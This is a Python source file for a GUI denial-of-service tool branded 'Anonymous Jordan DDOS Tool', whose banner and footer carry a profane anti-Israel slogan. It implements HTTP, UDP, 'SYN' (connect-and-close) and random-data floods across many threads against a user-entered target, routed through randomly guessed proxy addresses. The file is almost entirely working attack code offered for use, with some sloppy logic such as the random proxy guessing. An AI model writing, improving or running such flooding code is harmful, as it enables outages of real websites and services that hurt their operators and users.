import socket
import threading
import random
import time
import ssl
from urllib.parse import urlparse
import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime
import webbrowser

# لا تحتاج لتغيير شيء هنا، فقط لعرض النصوص الملونة في الـ Terminal
from colorama import Fore, Back, Style, init as colorama_init
colorama_init(autoreset=True)

class DDoSAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Anonymous Jordan DDOS Tool")
        self.root.geometry("900x600")
        self.root.configure(bg="black")  # ✅ استخدم اسم اللون مباشرة أو HEX
        
        # Attack stats
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.attack_active = False
        self.lock = threading.Lock()
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        
        self.create_banner()
        self.create_widgets()
        self.create_footer()
    
    def create_banner(self):
        banner_frame = tk.Frame(self.root, bg="black")
        banner_frame.pack(pady=10)
        
        banner_text = r"""
         ██████╗  ██████╗  ██████╗ ███████╗
        ██╔════╝ ██╔═══██╗██╔════╝ ██╔════╝
        ██║  ███╗██║   ██║██║  ███╗█████╗  
        ██║   ██║██║   ██║██║   ██║██╔══╝  
        ╚██████╔╝╚██████╔╝╚██████╔╝███████╗
         ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝
        """
        
        banner_label = tk.Label(
            banner_frame,
            text=banner_text,
            font=("Courier", 12),
            fg="red",  # ✅ استخدام اسم اللون
            bg="black",
            justify="center"
        )
        banner_label.pack()
        
        subtitle_label = tk.Label(
            banner_frame,
            text="Anonymous Jordan DDoS Tool - Fuck Isreal",
            font=("Arial", 14, "bold"),
            fg="green",  # ✅ استخدام اسم اللون
            bg="black"
        )
        subtitle_label.pack()
    
    def create_widgets(self):
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)
        
        # Target input
        target_frame = tk.Frame(main_frame, bg="black")
        target_frame.pack(fill="x", pady=10)
        
        tk.Label(target_frame, text="Target URL:", fg="cyan", bg="black", width=15).pack(side="left")
        self.target_entry = tk.Entry(target_frame, width=50, font=("Arial", 12))
        self.target_entry.pack(side="left", expand=True, fill="x")
        self.target_entry.insert(0, "https://example.com")
        
        # Attack options
        options_frame = tk.Frame(main_frame, bg="black")
        options_frame.pack(fill="x", pady=10)
        
        # Port
        port_frame = tk.Frame(options_frame, bg="black")
        port_frame.pack(fill="x", pady=5)
        tk.Label(port_frame, text="Port:", fg="cyan", bg="black", width=15).pack(side="left")
        self.port_var = tk.IntVar(value=80)
        self.port_entry = tk.Entry(port_frame, textvariable=self.port_var, width=10)
        self.port_entry.pack(side="left")
        
        # Duration
        duration_frame = tk.Frame(options_frame, bg="black")
        duration_frame.pack(fill="x", pady=5)
        tk.Label(duration_frame, text="Duration (seconds):", fg="cyan", bg="black", width=15).pack(side="left")
        self.duration_var = tk.IntVar(value=60)
        self.duration_entry = tk.Entry(duration_frame, textvariable=self.duration_var, width=10)
        self.duration_entry.pack(side="left")
        
        # Threads
        threads_frame = tk.Frame(options_frame, bg="black")
        threads_frame.pack(fill="x", pady=5)
        tk.Label(threads_frame, text="Threads:", fg="cyan", bg="black", width=15).pack(side="left")
        self.threads_var = tk.IntVar(value=50)
        self.threads_entry = tk.Entry(threads_frame, textvariable=self.threads_var, width=10)
        self.threads_entry.pack(side="left")
        
        # Attack mode
        attack_mode_frame = tk.Frame(options_frame, bg="black")
        attack_mode_frame.pack(fill="x", pady=5)
        tk.Label(attack_mode_frame, text="Attack Mode:", fg="cyan", bg="black", width=15).pack(side="left")
        self.attack_mode = ttk.Combobox(attack_mode_frame, values=["HTTP Flood", "SYN Flood", "UDP Flood", "Random Data Flood"], width=20)
        self.attack_mode.set("HTTP Flood")
        self.attack_mode.pack(side="left")
        
        # Attack buttons
        button_frame = tk.Frame(main_frame, bg="black")
        button_frame.pack(pady=20)
        
        self.start_button = tk.Button(
            button_frame, 
            text="Start Attack", 
            command=self.start_attack, 
            bg="green",  # ✅ استخدام اسم اللون
            fg="black", 
            width=15, 
            font=("Arial", 12, "bold")
        )
        self.start_button.pack(side="left", padx=5)
        
        self.stop_button = tk.Button(
            button_frame, 
            text="Stop Attack", 
            command=self.stop_attack, 
            bg="red",  # ✅ استخدام اسم اللون
            fg="black", 
            width=15, 
            font=("Arial", 12, "bold"),
            state=tk.DISABLED
        )
        self.stop_button.pack(side="left", padx=5)
        
        # Status display
        status_frame = tk.Frame(main_frame, bg="black")
        status_frame.pack(fill="both", expand=True)
        
        self.status_text = tk.Text(
            status_frame, 
            height=15, 
            width=80, 
            bg="black", 
            fg="white", 
            font=("Courier", 10),
            state="disabled"
        )
        self.status_text.pack(side="left", fill="both", expand=True)
        
        scrollbar = ttk.Scrollbar(status_frame, command=self.status_text.yview)
        scrollbar.pack(side="right", fill="y")
        self.status_text.configure(yscrollcommand=scrollbar.set)
        
        # ✅ إعداد Tags ملونة للكتابة في Text Widget
        self.status_text.tag_config("info", foreground="cyan")
        self.status_text.tag_config("success", foreground="green")
        self.status_text.tag_config("error", foreground="red")
        self.status_text.tag_config("summary", foreground="yellow")
    
    def create_footer(self):
        footer_frame = tk.Frame(self.root, bg="black")
        footer_frame.pack(side="bottom", fill="x", pady=10)
        
        footer_label = tk.Label(
            footer_frame,
            text="Fuck Isreal | DDoS Tool Made By Anonymous Jordan Team | All Attacks Under Supervision",
            fg="magenta",
            bg="black",
            font=("Arial", 10, "italic"),
            cursor="hand2"
        )
        footer_label.pack()
        footer_label.bind("<Button-1>", lambda e: webbrowser.open("https://anonymousjordan.org"))
    
    def log(self, message, tag="info"):
        self.status_text.config(state="normal")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.status_text.insert("end", f"[{timestamp}] {message}\n", tag)
        self.status_text.config(state="disabled")
        self.status_text.see("end")
    
    def generate_random_proxy(self):
        ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        port = random.choice([80, 8080, 3128, 8888, 8000])
        return f"{ip}:{port}"
    
    def is_proxy_valid(self, proxy):
        try:
            proxy_host, proxy_port = proxy.split(':')
            proxy_port = int(proxy_port)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((proxy_host, proxy_port))
            sock.close()
            
            return result == 0
        except:
            return False
    
    def http_flood(self, proxy=None):
        try:
            parsed_url = urlparse(self.target)
            host = parsed_url.netloc
            path = parsed_url.path or '/'
            query = parsed_url.query
            if query:
                path += '?' + query
            
            scheme = parsed_url.scheme.lower()
            port = self.port if scheme == 'http' else 443
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if proxy:
                proxy_host, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)
                
                if scheme == 'https':
                    sock.connect((proxy_host, proxy_port))
                    sock.send(f"CONNECT {host}:443 HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
                    response = sock.recv(4096)
                    if b'200 Connection Established' not in response:
                        with self.lock:
                            self.fail_count += 1
                        return
                else:
                    sock.connect((proxy_host, proxy_port))
            else:
                sock.connect((host, port))
            
            if scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            headers = {
                "Host": host,
                "User-Agent": random.choice(self.user_agents),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Connection": "keep-alive"
            }
            
            request_lines = [f"GET {path} HTTP/1.1"]
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
            request_lines.append("\r\n")
            request = "\r\n".join(request_lines).encode()
            
            sock.sendall(request)
            
            response = sock.recv(4096)
            
            if b'HTTP/' in response:
                with self.lock:
                    self.success_count += 1
            else:
                with self.lock:
                    self.fail_count += 1
            
            sock.close()
            
            with self.lock:
                self.total_requests += 1
                
        except Exception as e:
            with self.lock:
                self.fail_count += 1
            self.log(f"Failed to send request through proxy {proxy}: {str(e)}", "error")
        
        finally:
            with self.lock:
                self.total_requests += 1
    
    def syn_flood(self, proxy=None):
        # This is a simplified simulation - actual SYN flood requires raw sockets and admin privileges
        try:
            parsed_url = urlparse(self.target)
            host = parsed_url.netloc
            
            # Simulate SYN packets by connecting and immediately closing
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            sock.connect((host, self.port))
            sock.close()
            
            with self.lock:
                self.success_count += 1
                self.total_requests += 1
                
        except Exception as e:
            with self.lock:
                self.fail_count += 1
                self.total_requests += 1
            self.log(f"SYN Flood failed: {str(e)}", "error")
    
    def udp_flood(self, proxy=None):
        try:
            parsed_url = urlparse(self.target)
            host = parsed_url.netloc
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # Send random UDP packets
            for _ in range(10):  # Send 10 packets per attack cycle
                payload = random.randbytes(1024)
                sock.sendto(payload, (host, self.port))
                
            sock.close()
            
            with self.lock:
                self.success_count += 10  # Count each packet as a success
                self.total_requests += 10
                
        except Exception as e:
            with self.lock:
                self.fail_count += 10
                self.total_requests += 10
            self.log(f"UDP Flood failed: {str(e)}", "error")
    
    def random_data_flood(self, proxy=None):
        try:
            parsed_url = urlparse(self.target)
            host = parsed_url.netloc
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            sock.connect((host, self.port))
            
            # Send random data
            for _ in range(5):  # Send 5 chunks of random data
                payload = random.randbytes(1024)
                sock.sendall(payload)
                
            sock.close()
            
            with self.lock:
                self.success_count += 5
                self.total_requests += 5
                
        except Exception as e:
            with self.lock:
                self.fail_count += 5
                self.total_requests += 5
            self.log(f"Random Data Flood failed: {str(e)}", "error")
    
    def attack_loop(self):
        while self.attack_active:
            proxy = self.generate_random_proxy()
            
            if not self.is_proxy_valid(proxy):
                with self.lock:
                    self.fail_count += 1
                continue
            
            attack_mode = self.attack_mode.get()
            if attack_mode == "HTTP Flood":
                self.http_flood(proxy)
            elif attack_mode == "SYN Flood":
                self.syn_flood(proxy)
            elif attack_mode == "UDP Flood":
                self.udp_flood(proxy)
            elif attack_mode == "Random Data Flood":
                self.random_data_flood(proxy)
                
            # Rate limiting
            time.sleep(0.01)
    
    def update_stats(self):
        if self.attack_active:
            elapsed = time.time() - self.start_time
            rps = self.total_requests / elapsed if elapsed > 0 else 0
            
            stats_text = (
                f"{Fore.CYAN}Elapsed: {elapsed:.1f}s | "
                f"{Fore.GREEN}Success: {self.success_count} | "
                f"{Fore.RED}Failed: {self.fail_count} | "
                f"{Fore.YELLOW}Total: {self.total_requests} | "
                f"{Fore.BLUE}RPS: {rps:.1f}"
            )
            
            # Update status bar
            self.status_bar.config(text=stats_text)
            
        self.root.after(1000, self.update_stats)
    
    def start_attack(self):
        if self.attack_active:
            return
            
        self.target = self.target_entry.get().strip()
        if not self.target.startswith(("http://", "https://")):
            messagebox.showerror("Error", "Please enter a valid URL (including http:// or https://)")
            return
            
        try:
            self.port = self.port_var.get()
            self.duration = self.duration_var.get()
            self.threads = self.threads_var.get()
        except tk.TclError:
            messagebox.showerror("Error", "Please enter valid numeric values for port, duration, and threads")
            return
            
        if self.threads > 1000:
            if not messagebox.askyesno("Warning", "You are attempting to use more than 1000 threads. This could destabilize your system. Continue?"):
                return
        
        self.attack_active = True
        self.start_time = time.time()
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        
        # Disable start button and enable stop button
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Log attack start
        self.log(f"Starting {self.attack_mode.get()} attack on {self.target} for {self.duration} seconds", "info")
        
        # Start attack threads
        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack_loop, daemon=True)
            thread.start()
        
        # Start duration timer
        self.root.after(self.duration * 1000, self.stop_attack)
        
        # Start stats update
        self.update_stats()
    
    def stop_attack(self):
        self.attack_active = False
        
        # Enable start button and disable stop button
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        # Log attack end
        elapsed = time.time() - self.start_time
        rps = self.total_requests / elapsed if elapsed > 0 else 0
        
        summary = (
            f"\nSummary:"
            f"\nSuccessful Requests: {self.success_count}"
            f"\nFailed Requests: {self.fail_count}"
            f"\nTotal Requests Sent: {self.total_requests}"
            f"\nDuration: {elapsed:.2f} seconds"
            f"\nRequests Per Second: {rps:.2f}"
        )
        self.log(summary, "summary")
        
        # Reset stats bar
        self.status_bar.config(text="")
    
    def create_status_bar(self):
        self.status_bar = tk.Label(
            self.root, 
            text="", 
            bd=1, 
            relief=tk.SUNKEN, 
            anchor=tk.W,
            bg="black",
            fg="white"
        )
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSAttackGUI(root)
    app.create_status_bar()
    root.mainloop()
